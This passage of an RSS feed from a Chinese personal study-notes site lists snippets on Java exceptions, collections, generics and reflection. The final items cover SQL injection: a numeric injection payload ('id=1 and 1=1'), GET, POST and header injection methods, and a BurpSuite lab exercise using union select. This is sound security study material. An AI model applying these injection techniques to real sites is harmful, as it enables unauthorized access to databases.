写起来还是挺简单的</description></item><item><title>224_异常处理的原理</title><link>https://ob.tianzhongs.ml/224_%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E7%9A%84%E5%8E%9F%E7%90%86/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/224_%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E7%9A%84%E5%8E%9F%E7%90%86/</guid><description>224_异常处理的原理 [!tip]+ 强调 所有异常都是发生在运行阶段.
异常处理方法 java对异常的处理有两种方式: 上抛(上报)和捕获
[!tip]+ 异常的两种处理方式
在方法声明的位置上,使用throws关键字,抛给上一级,谁调用我,就抛给谁 [[#eg1 第一种异常处理 添加throws关键字]] 使用try{} catch{}语句进行异常捕获,异常发生了,谁都不知道,但是我抓住了. 相关: [[#第二种异常处理 使用try catch捕获异常]] [[225.</description></item><item><title>225_异常对象的常用方法</title><link>https://ob.tianzhongs.ml/225_%E5%BC%82%E5%B8%B8%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/225_%E5%BC%82%E5%B8%B8%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95/</guid><description>225_异常对象的常用方法 1 2 3 4 //获取异常的描述信息 String msg=excepiton.getMessage(); //打印异常的堆栈信息 exception.printStackTrace(); 使用printStackTrace不会让程序停止,只是输出堆栈异常信息,程序很健壮
eg1 1 2 3 4 5 6 7 public class Test05 { public static void main(String[] args) { NullPointerException e=new NullPointerException(&amp;#34;空指针异常~&amp;#34;); String msg=e.</description></item><item><title>226_finally语句</title><link>https://ob.tianzhongs.ml/226_finally%E8%AF%AD%E5%8F%A5/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/226_finally%E8%AF%AD%E5%8F%A5/</guid><description>226_finally语句 finally语句通常用于释放资源,这非常有必要. finally中的语句是一定会执行的,除非你退出JVMSystem.exe(0); finally可以不要catch,只要try finally 即使try里面有return,finally中的语句依然会执行 try不能单独使用 ![[225.异常对象的常用方法#eg2]] eg第三点 1 2 3 4 5 6 7 8 9 10 public class Test07 { public static void main(String[] args) { try { System.</description></item><item><title>227_finally面试题</title><link>https://ob.tianzhongs.ml/227_finally%E9%9D%A2%E8%AF%95%E9%A2%98/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/227_finally%E9%9D%A2%E8%AF%95%E9%A2%98/</guid><description>227_finally面试题 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 package com.</description></item><item><title>228_final,finally,finalize()的区别</title><link>https://ob.tianzhongs.ml/228_finalfinallyfinalize%E7%9A%84%E5%8C%BA%E5%88%AB/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/228_finalfinallyfinalize%E7%9A%84%E5%8C%BA%E5%88%AB/</guid><description>228_final,finally,finalize()的区别 [!faq]+ final,finally,finalize()的区别
final,finally是一个关键字, final用于修饰变量,类等等,表示最终的不可变的 finally是用于异常处理try catch,无论异常是否发生,finally中的语句都会发生 finalize是Object中的一个方法,是一个标识符,不是关键字,由JVM的GC垃圾回收器负责调用</description></item><item><title>2291_异常实际例子</title><link>https://ob.tianzhongs.ml/2291_%E5%BC%82%E5%B8%B8%E5%AE%9E%E9%99%85%E4%BE%8B%E5%AD%90/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/2291_%E5%BC%82%E5%B8%B8%E5%AE%9E%E9%99%85%E4%BE%8B%E5%AD%90/</guid><description>2291_异常实际例子 总结 [!tip]+ 书写方法注意点
首先异常类 继承RuntimeException或者Exception 两个方法，一个无参，一个String 其次写栈类：主要用来new对象，以及对异常的抛出 在方法中throws抛出异常 判断if什么情况需要抛出异常throw new StatckOperationException(&amp;quot;异常信息&amp;quot;); 最后测试类 注意try对象的判断，异常情况抛出的e的堆栈信息、异常信息描述是否需要打印 [[225.异常对象的常用方法]] eg1 栈操作 栈操作异常类</description></item><item><title>2292_继承的方法覆盖和异常</title><link>https://ob.tianzhongs.ml/2292_%E7%BB%A7%E6%89%BF%E7%9A%84%E6%96%B9%E6%B3%95%E8%A6%86%E7%9B%96%E5%92%8C%E5%BC%82%E5%B8%B8/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/2292_%E7%BB%A7%E6%89%BF%E7%9A%84%E6%96%B9%E6%B3%95%E8%A6%86%E7%9B%96%E5%92%8C%E5%BC%82%E5%B8%B8/</guid><description>2292_继承的方法覆盖和异常 ![[../../../../assets/Pasted image 20220726163010.png]] 总结： 子类继承父类的时候，方法覆盖的异常不能大于父类的异常，不能比父类异常多。 简单的描述：子类的异常只能是父类异常的子异常或者同等异常，要么就不写 相关：[[../../爪哇基础/07方法覆盖和多态/01方法覆盖/071.方法覆盖override]]
没有异常&amp;gt;父类异常&amp;gt;子类异常 不写就是默认的父类的异常</description></item><item><title>229_如何自定义异常(自己编写异常)</title><link>https://ob.tianzhongs.ml/229_%E5%A6%82%E4%BD%95%E8%87%AA%E5%AE%9A%E4%B9%89%E5%BC%82%E5%B8%B8%E8%87%AA%E5%B7%B1%E7%BC%96%E5%86%99%E5%BC%82%E5%B8%B8/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/229_%E5%A6%82%E4%BD%95%E8%87%AA%E5%AE%9A%E4%B9%89%E5%BC%82%E5%B8%B8%E8%87%AA%E5%B7%B1%E7%BC%96%E5%86%99%E5%BC%82%E5%B8%B8/</guid><description>229_如何自定义异常(自己编写异常) 步骤 定义一个异常,继承Exception或者RuntimeException 提供两个方法,一个有参数的,一个String参数的 eg 定义异常
1 2 3 4 5 6 7 8 9 public class MyException extends RuntimeException{ public MyException(){ } public MyException(String s) { super(s); } }</description></item><item><title>2301_集合list概述</title><link>https://ob.tianzhongs.ml/2301_%E9%9B%86%E5%90%88list%E6%A6%82%E8%BF%B0/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/2301_%E9%9B%86%E5%90%88list%E6%A6%82%E8%BF%B0/</guid><description>2301_集合list概述 包类: java.util
概述 数组就是以一个集合，但是集合可以容纳不同数据类型的数据 是一个容器，可以一次容纳多个对象 集合存储的是java对象的内存地址，是引用，引用对象本身的内存地址。并不是对象本身。不能存储基本数据类型，也不能存储对象。![[../../../../assets/Pasted image 20220727164431.png]] 不同的集合，底层会对应不同的数据结构，往不同的集合中存储数据，相当于放到了不同的数据结构中 集合分类 Java中集合分为两类：
单个方式存储元素，超级父接口为：java.util.Collection 键值对方式存储元素，超级父接口为：java.util.Map</description></item><item><title>2302集合继承结构图1_Collection</title><link>https://ob.tianzhongs.ml/2302%E9%9B%86%E5%90%88%E7%BB%A7%E6%89%BF%E7%BB%93%E6%9E%84%E5%9B%BE1_Collection/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/2302%E9%9B%86%E5%90%88%E7%BB%A7%E6%89%BF%E7%BB%93%E6%9E%84%E5%9B%BE1_Collection/</guid><description>2302集合继承结构图1_Collection 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 classDiagram class Iterable{ &amp;lt;&amp;lt;interface&amp;gt;&amp;gt; +iterator() 所有集合元素都是可以迭代的， 可以遍历的 } class Collection{ &amp;lt;&amp;lt;interface&amp;gt;&amp;gt; Collection } Collection--&amp;gt;Iterator:关联，has a Collection--|&amp;gt;Iterable:泛化，继承，is a class Iterator{ &amp;lt;&amp;lt;interface&amp;gt;&amp;gt; 集合的迭代器对象 +hasNext() +next() +remove() } class List{ &amp;lt;&amp;lt;interface&amp;gt;&amp;gt; 有序可重复 有下标 } %%有序说的是，存进去什么顺序，取出来还是什么顺序，不是大小的排序%% List--|&amp;gt;Collection:泛化 class ArrayList{ 非线程安全 数据结构：数组 } ArrayList.</description></item><item><title>2303集合继承结构图2_Map</title><link>https://ob.tianzhongs.ml/2303%E9%9B%86%E5%90%88%E7%BB%A7%E6%89%BF%E7%BB%93%E6%9E%84%E5%9B%BE2_Map/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/2303%E9%9B%86%E5%90%88%E7%BB%A7%E6%89%BF%E7%BB%93%E6%9E%84%E5%9B%BE2_Map/</guid><description>2303集合继承结构图2_Map 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 classDiagram class Map{ &amp;lt;&amp;lt;interface&amp;gt;&amp;gt; } class HashMap{ 非线程安全 数据结构：哈希表 } HashMap.</description></item><item><title>2304_Collection中常用的方法</title><link>https://ob.tianzhongs.ml/2304_Collection%E4%B8%AD%E5%B8%B8%E7%94%A8%E7%9A%84%E6%96%B9%E6%B3%95/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/2304_Collection%E4%B8%AD%E5%B8%B8%E7%94%A8%E7%9A%84%E6%96%B9%E6%B3%95/</guid><description>2304_Collection中常用的方法 [!faq]+ java.util.collection中能够存放的元素
没有使用泛型，collection中可以存放Object中的所有子类型 使用泛型之后，collection中只能存放某种具体的类型 集合中不能直接存储基本数据类型，也不能存储java对象，存储的只是**java对象的内存地址 eg 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 import java.</description></item><item><title>2305_Collection迭代器的使用Iterator</title><link>https://ob.tianzhongs.ml/2305_Collection%E8%BF%AD%E4%BB%A3%E5%99%A8%E7%9A%84%E4%BD%BF%E7%94%A8Iterator/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/2305_Collection%E8%BF%AD%E4%BB%A3%E5%99%A8%E7%9A%84%E4%BD%BF%E7%94%A8Iterator/</guid><description>2305_Collection迭代器的使用Iterator [!tip]+ 迭代器遍历步骤
获取集合的迭代器对象itorator Iterator it=xxx.iterator(); 进行迭代器遍历 1 2 3 4 //判断是否有下一个元素，有的话就执行输出，没有就停止循环 while (it.hasNext()){ System.out.println(it.next()); } eg 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 import java.</description></item><item><title>2306__Collection的contains</title><link>https://ob.tianzhongs.ml/2306__Collection%E7%9A%84contains/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/2306__Collection%E7%9A%84contains/</guid><description>2306__Collection的contains 总结 contains底层调用的是通过equals方法去对内容进行比对，查看查看集合中是否包含，如果是String方法的话，因为已经被重写，所以是比较的字符内容是否包含。 放在集合中的内容，如果要使用contains()或者[[23.07.remove方法|remove()]]，那么必须要重写equals方法 源代码 ![[../../../../assets/Pasted image 20220729090025.png]]
eg 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 import java.</description></item><item><title>2307_remove方法</title><link>https://ob.tianzhongs.ml/2307_remove%E6%96%B9%E6%B3%95/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/2307_remove%E6%96%B9%E6%B3%95/</guid><description>2307_remove方法 和contains一样，底层也使用了equals方法去对比，然后删除集合中的对应元素，所以需要重写equals方法 在迭代器迭代的过程中，要使用 迭代器.remove()的方法去删除元，因为集合.remove()会改变集合结构，需要构造new迭代器，不然会出现异常</description></item><item><title>2308_List特有的方法</title><link>https://ob.tianzhongs.ml/2308_List%E7%89%B9%E6%9C%89%E7%9A%84%E6%96%B9%E6%B3%95/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/2308_List%E7%89%B9%E6%9C%89%E7%9A%84%E6%96%B9%E6%B3%95/</guid><description>2308_List特有的方法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 import com.</description></item><item><title>2309_ArrayList和Vector</title><link>https://ob.tianzhongs.ml/2309_ArrayList%E5%92%8CVector/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/2309_ArrayList%E5%92%8CVector/</guid><description>2309_ArrayList和Vector 属性 ArrayList Vector 默认容量 10 10 扩容容量 1.5倍 2倍 底层 数组 数组 底层 非线程安全 线程安全 优点 检索快 增删快 怎么得到一个线程安全的List： Collections.</description></item><item><title>2310_LinkedList双向链表</title><link>https://ob.tianzhongs.ml/2310_LinkedList%E5%8F%8C%E5%90%91%E9%93%BE%E8%A1%A8/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/2310_LinkedList%E5%8F%8C%E5%90%91%E9%93%BE%E8%A1%A8/</guid><description>2310_LinkedList双向链表 特点 LinkedList没有初始化容量，最初的链表中first和last都是null 增删效率高 不能通过数学表达式计算被查找元素的内存地址，每一次查找都是从头节点开始遍历 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 import javax.</description></item><item><title>2311_LinkedList</title><link>https://ob.tianzhongs.ml/2311_LinkedList/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/2311_LinkedList/</guid><description>2311_LinkedList 需要做的： 1. [ ] 手写linkedlist数据结构 2. [ ] 其优点与缺点 3. [ ] 转换成线程安全的方法colllections工具类里面的sync 4. [ ] 泛型机制 5. [ ] 类型自动推断：钻石表达式</description></item><item><title>2311_Vector</title><link>https://ob.tianzhongs.ml/2311_Vector/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/2311_Vector/</guid><description>2311_Vector 底层是数组 默认容量10，扩容2倍（ArrayList扩容是1.5倍） 线程安全，但是效率会低 可以采用Collections.synchronizedList(ArrayList);的方法将ArrayList转换为Vector的线程安全 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 import java.</description></item><item><title>2312_HashSet和TreeSet</title><link>https://ob.tianzhongs.ml/2312_HashSet%E5%92%8CTreeSet/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/2312_HashSet%E5%92%8CTreeSet/</guid><description>2312_HashSet和TreeSet 两个set存入的数据都不会重复 TreeSet存入的数据会自动排序，可排序集合 TreeSet无序可排序，无序值得是存进去和取出来的数据顺序不一样 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 import java.</description></item><item><title>2313_Map接口的常用方法</title><link>https://ob.tianzhongs.ml/2313_Map%E6%8E%A5%E5%8F%A3%E7%9A%84%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/2313_Map%E6%8E%A5%E5%8F%A3%E7%9A%84%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95/</guid><description>2313_Map接口的常用方法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 import java.</description></item><item><title>2314_Map的两种遍历方式</title><link>https://ob.tianzhongs.ml/2314_Map%E7%9A%84%E4%B8%A4%E7%A7%8D%E9%81%8D%E5%8E%86%E6%96%B9%E5%BC%8F/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/2314_Map%E7%9A%84%E4%B8%A4%E7%A7%8D%E9%81%8D%E5%8E%86%E6%96%B9%E5%BC%8F/</guid><description>2314_Map的两种遍历方式 Map的两种遍历 Created: July 30, 2022 4:56 PM Tags: 遍历 类别: Map
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 import java.</description></item><item><title>2315_HashMap</title><link>https://ob.tianzhongs.ml/2315_HashMap/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/2315_HashMap/</guid><description>2315_HashMap HashMap Created: July 30, 2022 5:18 PM Tags: 实现原理 类别: HashMap
内存图
简述 HashMap：加载因子0.75，默认容量16，初始化容量必须是2的倍数
💡 HashMap类似于由**单向链表组成的数组 数据结构：哈希表** 哈希表的特点： 结合了数组和链表各自的优点，相当于由一个个单向链表组成的数组</description></item><item><title>2316_HashSet重写equals和hashCode方法</title><link>https://ob.tianzhongs.ml/2316_HashSet%E9%87%8D%E5%86%99equals%E5%92%8ChashCode%E6%96%B9%E6%B3%95/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/2316_HashSet%E9%87%8D%E5%86%99equals%E5%92%8ChashCode%E6%96%B9%E6%B3%95/</guid><description>2316_HashSet重写equals和hashCode方法 HashSet重写equals和hashCode方法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 import java.</description></item><item><title>2317_HashMap和HashTable的区别</title><link>https://ob.tianzhongs.ml/2317_HashMap%E5%92%8CHashTable%E7%9A%84%E5%8C%BA%E5%88%AB/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/2317_HashMap%E5%92%8CHashTable%E7%9A%84%E5%8C%BA%E5%88%AB/</guid><description>2317_HashMap和HashTable的区别 HashMap允许key为null，HashTable不允许key和value为null HashTable有线程安全，但是对线程处理效率低，使用较少 HashTable的初始化容量是11，默认加载因子0.75（加载因子：当使用的容量达到这个比率就会进行扩容）；HashMap的初始化容量是16，默认加载因子也是0.75，当链表节点数量大于8，变成红黑树，小于6，变回单向链表 Hashtable的扩容：原容量*2+1</description></item><item><title>2318_Hashtable的Properties属性类</title><link>https://ob.tianzhongs.ml/2318_Hashtable%E7%9A%84Properties%E5%B1%9E%E6%80%A7%E7%B1%BB/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/2318_Hashtable%E7%9A%84Properties%E5%B1%9E%E6%80%A7%E7%B1%BB/</guid><description>2318_Hashtable的Properties属性类 帮助文档： Properties
Properties是一个Map集合，继承Hashtable，Properties的key和value都是String类型 被称为属性类对象 两个基本的方法 setProperty()相当于put，getProperty()相当于get
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import java.</description></item><item><title>2319_TreeSet关于排序：实现comparable接口或使用比较器Compartor</title><link>https://ob.tianzhongs.ml/2319_TreeSet%E5%85%B3%E4%BA%8E%E6%8E%92%E5%BA%8F%E5%AE%9E%E7%8E%B0comparable%E6%8E%A5%E5%8F%A3%E6%88%96%E4%BD%BF%E7%94%A8%E6%AF%94%E8%BE%83%E5%99%A8Compartor/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/2319_TreeSet%E5%85%B3%E4%BA%8E%E6%8E%92%E5%BA%8F%E5%AE%9E%E7%8E%B0comparable%E6%8E%A5%E5%8F%A3%E6%88%96%E4%BD%BF%E7%94%A8%E6%AF%94%E8%BE%83%E5%99%A8Compartor/</guid><description>2319_TreeSet关于排序：实现comparable接口或使用比较器Compartor 💡 Comparable和Comparator怎么选择呢？ 当比较规则不会发生改变的时候，或者说**当比较规则只有1个的时候，建议实现Comparable接口。**因为这个要去实现，没下面那个方便，下面那个方便，但是每次都要作为参数传进去 如果比较规则有多个，并且需要多个比较规则之间频繁切换，建议使用Comparator接口。
第一种：实现comparable接口 关于TreeSet自定义类的排序，书写代码时需要注意 继承Comparable接口 override compareTo``方法 有必要的话，把toString方法也override compareTo的比较规则怎么写 通过对象的属性进行比较，比如是String，可以用它本身就实现了的compareTo去进行比较，返回的一个数值能够代表他的数值 通过数值大小比较 使用if结合起来比较 无论怎么写，返回的都是一个数值，通过这个数值进行比较，一般是升序 原因 TreeSet中存入的数据会默认的排序，因为String和Integer都是默认实现了Comparable接口，对排序的规则已经进行了一定，所以不用再写了。 但是，别的自己定义的类，没有定义规则，所以需要实现Comparable接口，不然无法排序，添加节点元素就会报错Customer cannot be cast to java.</description></item><item><title>2320_自平衡二叉树数据结构</title><link>https://ob.tianzhongs.ml/2320_%E8%87%AA%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/2320_%E8%87%AA%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</guid><description>2320_自平衡二叉树数据结构 自平衡二叉树数据结构 原则：遵循左小右大
存放的过程就是排序的过程，取出来就是顺序
三种遍历方式 顺序说的是根的位置
前序遍历：根左右 中序遍历：左根右 TreeSet / TreeMap / Iterator迭代器 后序遍历：左右根 TreeSet和TreeMap采用的是中序遍历
中序表达式画图的例子
取出</description></item><item><title>2321_Collections工具类</title><link>https://ob.tianzhongs.ml/2321_Collections%E5%B7%A5%E5%85%B7%E7%B1%BB/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/2321_Collections%E5%B7%A5%E5%85%B7%E7%B1%BB/</guid><description>2321_Collections工具类 基本的使用 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 import java.</description></item><item><title>241_泛型</title><link>https://ob.tianzhongs.ml/241_%E6%B3%9B%E5%9E%8B/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/241_%E6%B3%9B%E5%9E%8B/</guid><description>241_泛型 泛型这种语法机制，只在程序编译阶段起作用，只是给编译器参考的。 编译器规范了集合的中存储数据的类型，比如就只能存储animal 子类特有方法依旧需要向下转型 泛型必须是引用数据类型，不能是基本数据类型 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 import com.</description></item><item><title>242_泛型方法的使用</title><link>https://ob.tianzhongs.ml/242_%E6%B3%9B%E5%9E%8B%E6%96%B9%E6%B3%95%E7%9A%84%E4%BD%BF%E7%94%A8/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/242_%E6%B3%9B%E5%9E%8B%E6%96%B9%E6%B3%95%E7%9A%84%E4%BD%BF%E7%94%A8/</guid><description>242_泛型方法的使用 定义
定义方法时同时定义了泛型的方法就是泛型方法 泛型方法的格式 1 2 3 public &amp;lt;T&amp;gt; void show(T name){ 方法体; } 实例 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 package test; public class Test02 { public static void main(String[] args) { String[] strings={&amp;#34;linsa&amp;#34;,&amp;#34;kanda&amp;#34;,&amp;#34;ondel&amp;#34;,&amp;#34;enter&amp;#34;}; Integer[] integers={2,34,53,5353,53}; // 使用函数进行打印 printArrs(strings); printArrs(integers); } /** * 打印任意类型数组的所有元素 * * @param arrs 泛型的数组 */ public static &amp;lt;T&amp;gt; void printArrs(T[] arrs){ if (arrs!</description></item><item><title>25_foreach</title><link>https://ob.tianzhongs.ml/25_foreach/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/25_foreach/</guid><description>25_foreach 缺点：没有下标，不能及时反馈下标 语法结构
1 2 3 4 For(数据类型 元素：数组或者集合 ){ 带元素的语句; } eg基本使用 1 2 3 4 5 6 7 8 9 public class Test02 { public static void main(String[] args) { int[] arr1={3,45,45,6,4,31,1,31,3,13,13}; for (int num:arr1 ) { System.</description></item><item><title>2801_反射机制</title><link>https://ob.tianzhongs.ml/2801_%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/2801_%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/</guid><description>2801_反射机制 Created: August 8, 2022 9:23 PM Date: August 8, 2022 类别: 反射机制
包类：java.lang.reflect.*
作用：操作字节码文件
相关的重要类 java.lang.Class 代表整个字节码，整个类型 java.</description></item><item><title>2802_反射机制补充</title><link>https://ob.tianzhongs.ml/2802_%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E8%A1%A5%E5%85%85/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/2802_%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E8%A1%A5%E5%85%85/</guid><description>2802_反射机制补充 反射机制的作用 可以获取类文件（直接操作字节码文件） 可以破坏封装性（打破封装） 可以破坏泛型的约束（因为泛型只是在编译阶段出现异常，编译之后的字节码文件是不存在泛型的，所以可以通过直接操作字节码文件，来达到绕过泛型约束的作用） 更适合于做Java高级框架 采用反射机制 保存对象的所有成员变量值 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 package reflectTest; import java.</description></item><item><title>3.1SQL注入之数据类型</title><link>https://ob.tianzhongs.ml/3.1SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/3.1SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</guid><description>SQL注入之数据类型 （1）数字型注入点 许多网页链接有类似的结构 http://xxx.com/users.php?id=1 基于此种形式的注入，一般被叫做数字型注入点，缘由是其注入点 id 类型为数字，在大多数的网页中，诸如 查看用户个人信息，查看文章等，大都会使用这种形式的结构传递id等信息，交给后端，查询出数据库中对应的信息，返回给前台。这一类的 SQL 语句原型大概为 select * from 表名 where id=1 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：select * from 表名 where id=1 and 1=1</description></item><item><title>3.2SQL注入之提交方式</title><link>https://ob.tianzhongs.ml/3.2SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%8F%90%E4%BA%A4%E6%96%B9%E5%BC%8F/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/3.2SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%8F%90%E4%BA%A4%E6%96%B9%E5%BC%8F/</guid><description>SQL注入之数据提交方式 GET方式注入 get注入方式比较常见，主要是通过url中传输数据到后台，带入到数据库中去执行，可利用联合注入方式直接注入
POST方式注入 post提交方式主要适用于表单的提交，用于登录框的注入
方法：利用BurpSuite抓包进行重放修改内容进行，和get差别是需要借助抓包工具进行测试，返回结果主要为代码，也可转化为网页显示
Request方式注入 概念：超全局变量 PHP中的许多预定义变量都是“超全局的”，这意味着它们在一个脚本的全部作用域中都可以用，这些超全局变量是： $_REQUEST（获取GET/POST/COOKIE）COOKIE在新版本已经无法获取了 $_POST（获取POST传参） $_GET（获取GET传参） $_COOKIE（获取COOKIE传参） $_SERVER（包含了诸如头部信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组）
HTTP头注入 什么是Header头？
通常HTTP消息包括客户机向服务器的请求消息和服务器向客户机响应消息。 这两种类型的消息有一个起始行，一个或者多个头域，一个只是头域结束的空行和可选的消息体组成。 HTTP的头域包括通用头，请求头，响应头和实体头四个部分</description></item><item><title>3.3SQL注入靶场案例练习</title><link>https://ob.tianzhongs.ml/3.3SQL%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E6%A1%88%E4%BE%8B%E7%BB%83%E4%B9%A0/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://ob.tianzhongs.ml/3.3SQL%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E6%A1%88%E4%BE%8B%E7%BB%83%E4%B9%A0/</guid><description>SQL注入靶场案例练习 Less-11 POST - Error Based - Single quotes- String (基于错误的POST型单引号字符型注入) 用burpsuit，抓包修改参数
联合查询union select测试payload
